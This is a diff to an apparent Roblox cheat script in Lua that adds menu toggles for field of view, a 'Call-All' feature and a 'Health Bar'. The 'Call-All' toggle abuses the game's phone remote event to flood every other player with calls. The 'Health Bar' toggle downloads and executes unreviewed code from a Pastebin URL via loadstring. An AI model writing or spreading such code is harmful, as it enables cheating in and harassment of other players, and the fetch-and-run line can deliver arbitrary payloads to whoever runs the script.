@@ -7636,10 +7636,19 @@ local ResolutionToggle = SelfSection:Toggle({
     end
 })
 
-
-
-
-
+local FovToggle = SelfSection:Toggle({
+    Name = "Adjust Fov",
+    Flag = "Adjust Fov",
+    Default = 1,
+    Value = {
+        Min = 70.0,
+        Max = 120.0,
+        Default = 70.0,
+    },
+    Callback = function(value)
+       workspace.CurrentCamera.FieldOfView = value
+    end
+})
 
 -- 5️⃣ INFINITE STAMINA TOGGLE
 local StaminaToggle = SelfSection:Toggle({
@@ -7674,6 +7683,53 @@ SelfSection:Toggle({
         print("Click Delete:", Value)
     end
 })
+
+local MiscSection = SelfPage:Section({
+    Name = "Player Misc",
+    Description = "Misc for other players",
+    Icon = "123944728972740",
+    Side = 1
+})
+-- new section
+local CallallToggle = SelfSection:Toggle({
+    Name = "Call-All",
+    Flag = "Calls All",
+    Default = false,
+    Callback = function(state)
+    local ReplicatedStorage = game:GetService("ReplicatedStorage")
+        local Players = game:GetService("Players")
+        
+        local phoneEvent = ReplicatedStorage:FindFirstChild("RemoteEvents"):FindFirstChild("RE_Phone")
+        
+        if phoneEvent then
+            for _, player in pairs(Players:GetPlayers()) do
+                if player ~= game.Players.LocalPlayer then 
+                    phoneEvent:FireServer("CallRequest", { Target = player })
+        
+                    task.wait(1) 
+                    phoneEvent:FireServer("CallResponse", { Response = {true} }) 
+                end
+            end
+        end
+    end
+})
+
+local HealthToggle = SelfSection:Toggle({
+    Name = "Health Bar",
+    Flag = "Health Bar",
+    Type = "Checkbox",
+    Value = false,
+    Callback = function(state) 
+    if state then
+            loadstring(game:HttpGet('https://pastebin.com/raw/RZ7kbGD6'))()
+        end
+    end
+})
+
+
+
+
+
 
 -- =========================
 -- COMBAT SECTION
